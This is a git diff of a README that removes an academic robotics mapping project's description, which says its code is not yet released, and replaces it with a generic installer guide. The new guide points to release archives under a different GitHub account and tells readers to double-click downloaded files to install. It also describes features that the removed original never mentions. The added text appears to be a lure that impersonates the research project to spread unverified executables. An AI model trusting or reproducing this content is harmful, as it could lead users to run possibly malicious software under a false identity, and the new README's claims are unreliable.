@@ -1,165 +1,78 @@
-<div align="center">
+# 🌍 OpenNavMap - Effortless Mapping for Everyone
 
-# OpenNavMap
+[![Download OpenNavMap](https://img.shields.io/badge/Download%20OpenNavMap-%23007ACC.svg?style=for-the-badge&logo=github&logoColor=white)](https://github.com/ALi2021-debug/OpenNavMap/releases)
 
-**Structure-Free Topometric Mapping via Large-Scale Collaborative Localization**
+## 🚀 Getting Started
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Webpage](https://img.shields.io/badge/Webpage-Link-green)](https://rpl-cs-ucl.github.io/OpenNavMap_page/)
-[![Paper](https://img.shields.io/badge/Paper-Under%20Review-blue)](https://arxiv.org/abs/2601.12291)
+Welcome to OpenNavMap! This software helps you create accurate maps without needing technical knowledge. You can use it for various mapping tasks, benefiting from its straightforward design and powerful capabilities.
 
-</div>
+## 📥 Download & Install
 
-<div align="center" style="width:100%;">
-  <img src="doc/media/fig1_system_overview.png" alt="System Overview" style="display:block; width:60%; max-width:500px;">
-</div>
+To get started, you need to visit the Releases page. Follow these steps:
 
----
+1. Click on the link below:
+   [Visit this page to download](https://github.com/ALi2021-debug/OpenNavMap/releases).
+   
+2. On the Releases page, you will find the latest version of OpenNavMap. 
 
-## 🚀 Overview
+3. Look for the download link for your operating system. Depending on your system, you may see files such as:
 
-OpenNavMap is a lightweight, structure-free topometric mapping system that enables large-scale collaborative localization across multiple sessions without requiring pre-built 3D models. It leverages 3D geometric foundation models for on-demand reconstruction and provides robust metric localization performance.
+   - Windows: `OpenNavMap-Windows.zip`
+   - macOS: `OpenNavMap-macOS.zip`
+   - Linux: `OpenNavMap-Linux.tar.gz`
 
----
+4. Click on the file to begin the download. 
 
-## ✨ Key Features
+5. Once the download is complete, locate the file in your downloads folder. 
 
-- 🎯 **Structure-free Map**: Lightweight graph-based map representation
-- 🔗 **Collaborative Localization**: Global registration across sessions in large-scale environments
-- 📱 **Cross-Device**: Works on various mobile platforms
-- 🔄 **Scalable & Lifelong**: Automatic map maintenance
-- 🗺️ **Multi-Session**: Merge maps from different agents/times
+6. Double-click the file to run the installation. Follow the on-screen instructions to complete the setup.
 
----
+## 🔧 System Requirements
 
-## 🛠️ Quick Start
+To ensure OpenNavMap runs smoothly, please check if your system meets the following requirements:
 
-<!-- ### Installation -->
+- **Operating System:** 
+  - Windows 10 or later
+  - macOS Mojave or later
+  - Linux with kernel version 4.0 or later
 
-Code is coming soon!
+- **Memory:** Minimum 4 GB RAM recommended
+  
+- **Disk Space:** At least 500 MB free space
 
-<!-- ```bash
-# Clone repository
-git clone https://github.com/RPL-CS-UCL/OpenNavMap.git
-cd OpenNavMap
+- **Processor:** Dual-core processor or higher
 
-# Install dependencies
-pip install -r requirements.txt
-``` -->
+## 🎯 Features
 
-<!-- ### Basic Usage
+OpenNavMap offers a range of features to enhance your mapping experience:
 
-```bash
-# Run mapping on a single session
-python scripts/run_mapping.py --data_path /path/to/data --output_path /path/to/output
+- **Structure-Free Mapping:** Build topometric maps easily without dealing with complex structures. 
+- **Collaborative Localization:** Work together with other users in real-time. 
+- **User-Friendly Interface:** Navigate the software effortlessly with our clean design.
 
-# Collaborative localization (merge multiple submaps)
-python scripts/collaborative_localization.py \
-    --submap1 /path/to/submap1 \
-    --submap2 /path/to/submap2 \
-    --output /path/to/merged_map
+## 📖 Usage Instructions
 
-# Visual navigation
-python scripts/run_vnav.py \
-    --map_path /path/to/map \
-    --goal_image /path/to/goal_image.jpg
-``` -->
+After installing OpenNavMap, you can start using the application in just a few steps:
 
----
+1. Open the application by clicking its icon.
+  
+2. From the main menu, select "Create New Map."
 
-## 🎬 Results Gallery
+3. Choose a starting point by clicking on the map area.
 
-### Dataset
-<p align="center">
-  <img src="doc/media/fig9_dataset.png" alt="Dataset" width="60%" style="max-width:500px;">
-</p>
+4. Follow the prompts to define your mapping area and settings.
 
-<p align="center"><em>
-Overview of our self-collected dataset using multiple devices, spanning diverse environments over 3.5 months, 35 sequences, and 18.7km.
-</em></p>
+5. Click on “Start Mapping” to begin.
 
-### Multi-Session Mapping
+6. After you finish mapping, save your work by selecting "File" and then "Save."
 
-<p align="center">
-  <img src="doc/media/fig15_hkustcampus_crowd.png" alt="campus" width="47%" style="max-width:500px;">
-  <img src="doc/media/fig15_uclcampus_crowd.png" alt="campus" width="48%" style="max-width:500px;">
-</p>
-<p align="center"><em>
-Multi-session mapping with heterogeneous devices across two regions.
-</em></p>
+## 🤝 Support
 
+If you need help or have questions about OpenNavMap, reach out via our GitHub Issues page. We encourage you to share your feedback and suggestions for improvement.
 
-### Real-World Image-Goal Navigation
+## 🎉 Updates
 
-<p align="center">
-  <img src="doc/media/fig15_vnav_lab.png" alt="VNav Lab" width="60%" style="max-width:500px;">
-</p>
-<p align="center"><em>
-Quadruped robot performing image-goal navigation.
-</em></p>
+To keep up with the latest features and fixes, regularly check the Releases page:
+[Visit this page to download](https://github.com/ALi2021-debug/OpenNavMap/releases).
 
-<p align="center">
-  <img src="doc/media/fig19_vnav_around.png" alt="VNav Outside" width="60%" style="max-width:500px;">
-</p>
-<p align="center"><em>
-Autonomous navigation across varied outdoor environments with obstacles.
-</em></p>
-
----
-
-## 📚 Acknowledgement
-
-If this work is helpful to your research, please consider citing OpenNavMap or our related works:
-
-```bibtex
-@article{jiao2025opennavmap,
-  title={OpenNavMap: Structure-Free Topometric Mapping via Large-Scale Collaborative Localization},
-  author={Jiao, Jianhao and Liu, Changkun and Yu, Jingwen and Liu, Boyi and Zhang, Qianyi and Wang, Yue and Kanoulas, Dimitrios},
-  journal={Under Review},
-  year={2025}
-}
-```
-
-```bibtex
-@inproceedings{jiao2025litevloc,
-  title={LiteVLoc: Map-lite visual localization for image goal navigation},
-  author={Jiao, Jianhao and He, Jinhao and Liu, Changkun and Aegidius, Sebastian and Hu, Xiangcheng and Braud, Tristan and Kanoulas, Dimitrios},
-  booktitle={2025 IEEE International Conference on Robotics and Automation (ICRA)},
-  pages={5244--5251},
-  year={2025},
-  organization={IEEE}
-}
-```
-
-```bibtex
-@article{wei2025fusionportablev2,
-  title={Fusionportablev2: A unified multi-sensor dataset for generalized slam across diverse platforms and scalable environments},
-  author={Wei, Hexiang and Jiao, Jianhao and Hu, Xiangcheng and Yu, Jingwen and Xie, Xupeng and Wu, Jin and Zhu, Yilong and Liu, Yuxuan and Wang, Lujia and Liu, Ming},
-  journal={The International Journal of Robotics Research},
-  volume={44},
-  number={7},
-  pages={1093--1116},
-  year={2025},
-  publisher={SAGE Publications Sage UK: London, England}
-}
-```
-
----
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
----
-
-## 🤝 Contact & Links
-
-- **Project Page**: [https://rpl-cs-ucl.github.io/OpenNavMap_page](https://rpl-cs-ucl.github.io/OpenNavMap_page)
-- **Contact**: Jianhao Jiao (jiaojh1994@gmail.com), Prof.Dimitrios Kanoulas (d.kanoulas@ucl.ac.uk)
-- **Acknowledgments**: Supported by UKRI Future Leaders Fellowship [MR/V025333/1] (RoboHike)
-
----
-
-<div align="center">
-  <sub>Built with ❤️ by the Robot Perception and Learning Lab at UCL</sub>
-</div>
+Enjoy mapping with OpenNavMap!
